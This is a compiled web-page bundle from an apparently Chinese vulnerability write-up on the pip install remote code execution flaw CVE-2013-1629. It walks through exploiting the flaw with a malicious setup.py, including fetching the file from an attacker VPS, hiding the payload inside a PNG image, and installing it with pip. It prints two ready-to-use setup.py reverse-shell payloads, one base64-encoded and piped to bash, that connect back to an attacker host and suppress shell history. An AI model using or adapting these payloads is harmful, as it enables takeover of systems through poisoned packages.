import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c,a as n,b as s,d as e,e as t}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,[s("当通过 HTTP 从 Pypi 存储库检索包时，不会检查包内容的完整性。利用这个缺陷，攻击者可以通过 "),n("code",null,"pip install"),s(" 来执行代码。")],-1),d=n("p",null,"参考阅读：",-1),k={href:"https://github.com/0x00-0x00/FakePip",target:"_blank",rel:"noopener noreferrer"},v={href:"https://www.sourceclear.com/vulnerability-database/security/remote-code-execution-rce-using-pip/python/sid-2098",target:"_blank",rel:"noopener noreferrer"},m=t(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>pip &lt; 1.3
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><h3 id="方式-1-fakepip" tabindex="-1"><a class="header-anchor" href="#方式-1-fakepip" aria-hidden="true">#</a> 方式 1 FakePip</h3><p>将 <a href="#%E6%BC%8F%E6%B4%9EPOC">setup.py</a> 文件下载到远程目标：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ wget http://your-vps-ip/setup.py
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在 VPS 上监听端口，在远程目标上执行命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ mkdir fakepip
$ mv setup.py fakepip/
$ cd fakepip
# sudo /usr/bin/pip install . --upgrade --force-reinstall
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>成功获取反弹 Shell。</p><h3 id="方式-2-图片马" tabindex="-1"><a class="header-anchor" href="#方式-2-图片马" aria-hidden="true">#</a> 方式 2 图片马</h3><p>将 <a href="#%E6%BC%8F%E6%B4%9EPOC">setup.py</a> 文件放在文件夹中并压缩命名为，选择一张图片 test.png，制作图片马：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ copy /b test.png + pic.zip pic.png
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在 VPS 上监听端口，将图片上传至公网图床，复制链接，在远程目标上执行命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ pip install &quot; https://&lt;your-img-link&gt;&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>也将图片可以上传到 VPS，在远程目标上执行命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ pip3 install &quot;http://192&quot;.&quot;168&quot;.&quot;xx&quot;.&quot;xxx/pic.png&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞-poc" tabindex="-1"><a class="header-anchor" href="#漏洞-poc" aria-hidden="true">#</a> 漏洞 POC</h2>`,17),b={href:"http://setup.py",target:"_blank",rel:"noopener noreferrer"},h=t(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> setuptools <span class="token keyword">import</span> setup
<span class="token keyword">from</span> setuptools<span class="token punctuation">.</span>command<span class="token punctuation">.</span>install <span class="token keyword">import</span> install
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> os


<span class="token keyword">class</span> <span class="token class-name">CustomInstall</span><span class="token punctuation">(</span>install<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
    install<span class="token punctuation">.</span>run<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
    LHOST <span class="token operator">=</span> <span class="token string">&#39;localhost&#39;</span>  <span class="token comment"># change this</span>
    LPORT <span class="token operator">=</span> <span class="token number">13372</span>
    
    reverse_shell <span class="token operator">=</span> <span class="token string">&#39;python -c &quot;import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\\&#39;{LHOST}\\&#39;, {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\\&#39;HISTFILE\\&#39;, \\&#39;/dev/null\\&#39;); pty.spawn(\\&#39;/bin/bash\\&#39;); s.close();&quot;&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>LHOST<span class="token operator">=</span>LHOST<span class="token punctuation">,</span>LPORT<span class="token operator">=</span>LPORT<span class="token punctuation">)</span>
    encoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>reverse_shell<span class="token punctuation">)</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">&#39;echo %s|base64 -d|bash&#39;</span> <span class="token operator">%</span> encoded<span class="token punctuation">)</span>


setup<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">&#39;FakePip&#39;</span><span class="token punctuation">,</span>
      version<span class="token operator">=</span><span class="token string">&#39;0.0.1&#39;</span><span class="token punctuation">,</span>
      description<span class="token operator">=</span><span class="token string">&#39;This will exploit a sudoer able to /usr/bin/pip install *&#39;</span><span class="token punctuation">,</span>
      zip_safe<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>
      cmdclass<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&#39;install&#39;</span><span class="token punctuation">:</span> CustomInstall<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1),g={href:"http://setup.py",target:"_blank",rel:"noopener noreferrer"},_=t(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> setuptools <span class="token keyword">import</span> setup
<span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os
<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">import</span> socket<span class="token punctuation">,</span> time<span class="token punctuation">,</span>pty<span class="token punctuation">,</span> os
  host<span class="token operator">=</span><span class="token string">&#39;{LHOST}&#39;</span>
  port<span class="token operator">=</span><span class="token string">&#39;{LPORT}&#39;</span>
  s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
  s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
  s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
  os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
  os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
  os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
  os<span class="token punctuation">.</span>putenv<span class="token punctuation">(</span><span class="token string">&quot;HISTFILE&quot;</span><span class="token punctuation">,</span><span class="token string">&#39;/dev/null&#39;</span><span class="token punctuation">)</span>
  pty<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span><span class="token string">&quot;/bin/bash&quot;</span><span class="token punctuation">)</span>
  s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
run<span class="token punctuation">(</span><span class="token punctuation">)</span>

setup<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">&quot;FakePip&quot;</span><span class="token punctuation">,</span> version<span class="token operator">=</span><span class="token string">&quot;1.0&quot;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1);function x(f,y){const a=o("ExternalLinkIcon");return i(),c("div",null,[u,r,d,n("ul",null,[n("li",null,[n("a",k,[s("https://github.com/0x00-0x00/FakePip"),e(a)])]),n("li",null,[n("a",v,[s("https://www.sourceclear.com/vulnerability-database/security/remote-code-execution-rce-using-pip/python/sid-2098"),e(a)])])]),m,n("p",null,[s("方式 1 "),n("a",b,[s("setup.py"),e(a)])]),h,n("p",null,[s("方式 2 "),n("a",g,[s("setup.py"),e(a)])]),_])}const P=p(l,[["render",x],["__file","Python pip install RCE 漏洞 CVE-2013-1629.html.vue"]]);export{P as default};
